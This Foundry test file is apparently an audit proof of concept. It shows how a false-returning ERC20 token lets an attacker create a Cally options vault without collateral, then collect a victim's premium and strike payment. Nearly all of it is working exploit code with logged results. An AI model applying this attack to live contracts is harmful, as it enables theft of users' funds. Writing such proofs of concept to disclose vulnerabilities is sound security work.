// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";

/// @notice Mock ERC20 token that returns false on failed transfers instead of reverting
contract FalseReturningERC20 is ERC20 {
    constructor() ERC20("False Token", "FALSE", 18) {}

    /// @notice Override transfer to return false instead of reverting on insufficient balance
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if (balanceOf[msg.sender] < amount) {
            return false;
        }
        balanceOf[msg.sender] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    /// @notice Override transferFrom to return false instead of reverting on insufficient balance/allowance
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (balanceOf[from] < amount) {
            return false;
        }
        
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max && allowed < amount) {
            return false;
        }

        balanceOf[from] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }

        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ExploitTest is Test {
    Cally public cally;
    FalseReturningERC20 public falseToken;
    
    address public attacker = address(0x1337);
    address public victim = address(0x4444);
    
    uint256 public constant VAULT_AMOUNT = 100 ether;
    uint256 public constant PREMIUM = 0.1 ether;
    uint256 public constant STRIKE = 5 ether;

    function setUp() public {
        // Deploy Cally contract
        cally = new Cally();
        
        // Deploy false-returning ERC20 token
        falseToken = new FalseReturningERC20();
        
        // Fund victim with ETH for premium and strike
        vm.deal(victim, 100 ether);
        
        // Fund attacker with ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function testExploit_CreateVaultWithoutCollateral() public {
        console.log("=== Initial State ===");
        console.log("Attacker ETH balance:", attacker.balance);
        console.log("Victim ETH balance:", victim.balance);
        console.log("Attacker token balance:", falseToken.balanceOf(attacker));
        console.log("Cally contract token balance:", falseToken.balanceOf(address(cally)));
        
        // Step 1: Attacker creates vault without providing any tokens
        // The attacker has 0 balance and 0 allowance, so transferFrom will return false
        // but won't revert, allowing the vault to be created
        console.log("\n=== Step 1: Attacker creates vault without collateral ===");
        
        vm.startPrank(attacker);
        
        // Attacker approves Cally to spend tokens (but has 0 balance)
        falseToken.approve(address(cally), VAULT_AMOUNT);
        
        // Create vault - this should fail to transfer tokens but succeed in creating vault
        uint256 vaultId = cally.createVault(
            VAULT_AMOUNT,           // tokenIdOrAmount
            address(falseToken),    // token
            4,                      // premiumIndex (0.1 ETH)
            7,                      // durationDays
            3,                      // dutchAuctionStartingStrikeIndex (5 ETH)
            1 ether,                // dutchAuctionReserveStrike
            Cally.TokenType.ERC20   // tokenType
        );
        
        vm.stopPrank();
        
        console.log("Vault created with ID:", vaultId);
        console.log("Attacker token balance after vault creation:", falseToken.balanceOf(attacker));
        console.log("Cally contract token balance after vault creation:", falseToken.balanceOf(address(cally)));
        
        // Verify vault was created without tokens being transferred
        assertEq(falseToken.balanceOf(address(cally)), 0, "Cally should have 0 tokens");
        assertEq(falseToken.balanceOf(attacker), 0, "Attacker should have 0 tokens");
        assertEq(cally.ownerOf(vaultId), attacker, "Attacker should own vault");
        
        // Step 2: Victim buys option and pays premium
        console.log("\n=== Step 2: Victim buys option ===");
        
        vm.startPrank(victim);
        
        uint256 premium = cally.getPremium(vaultId);
        console.log("Premium to pay:", premium);
        
        uint256 optionId = cally.buyOption{value: premium}(vaultId);
        
        vm.stopPrank();
        
        console.log("Option bought with ID:", optionId);
        console.log("Victim ETH balance after buying option:", victim.balance);
        console.log("Attacker unclaimed ETH balance:", cally.ethBalance(attacker));
        
        // Verify victim paid premium
        assertEq(cally.ethBalance(attacker), premium, "Attacker should have premium in balance");
        assertEq(cally.ownerOf(optionId), victim, "Victim should own option");
        
        // Step 3: Victim exercises option and pays strike
        console.log("\n=== Step 3: Victim exercises option ===");
        
        vm.startPrank(victim);
        
        Cally.Vault memory vault = cally.vaults(vaultId);
        uint256 strike = vault.currentStrike;
        console.log("Strike to pay:", strike);
        
        uint256 victimBalanceBefore = victim.balance;
        uint256 victimTokenBalanceBefore = falseToken.balanceOf(victim);
        
        // Exercise option - victim pays strike but receives no tokens
        cally.exercise{value: strike}(optionId);
        
        vm.stopPrank();
        
        uint256 victimBalanceAfter = victim.balance;
        uint256 victimTokenBalanceAfter = falseToken.balanceOf(victim);
        
        console.log("Victim ETH balance after exercise:", victimBalanceAfter);
        console.log("Victim token balance after exercise:", victimTokenBalanceAfter);
        console.log("Attacker unclaimed ETH balance:", cally.ethBalance(attacker));
        
        // Verify victim paid strike but received no tokens
        assertEq(victimBalanceBefore - victimBalanceAfter, strike, "Victim should have paid strike");
        assertEq(victimTokenBalanceAfter - victimTokenBalanceBefore, 0, "Victim should have received 0 tokens");
        assertEq(cally.ethBalance(attacker), premium + strike, "Attacker should have premium + strike");
        
        // Step 4: Attacker harvests all ETH
        console.log("\n=== Step 4: Attacker harvests ETH ===");
        
        uint256 attackerBalanceBefore = attacker.balance;
        
        vm.prank(attacker);
        cally.harvest();
        
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("Attacker ETH balance after harvest:", attackerBalanceAfter);
        console.log("Attacker profit:", profit);
        
        // Verify attacker successfully stole funds
        assertEq(profit, premium + strike, "Attacker should have harvested premium + strike");
        assertEq(cally.ethBalance(attacker), 0, "Attacker should have 0 unclaimed balance");
        
        console.log("\n=== Final State ===");
        console.log("Attacker total profit:", profit);
        console.log("Victim total loss (ETH):", premium + strike);
        console.log("Victim tokens received:", victimTokenBalanceAfter);
        console.log("\n[EXPLOIT SUCCESSFUL] Attacker stole", profit / 1e18, "ETH without providing any collateral");
    }
}
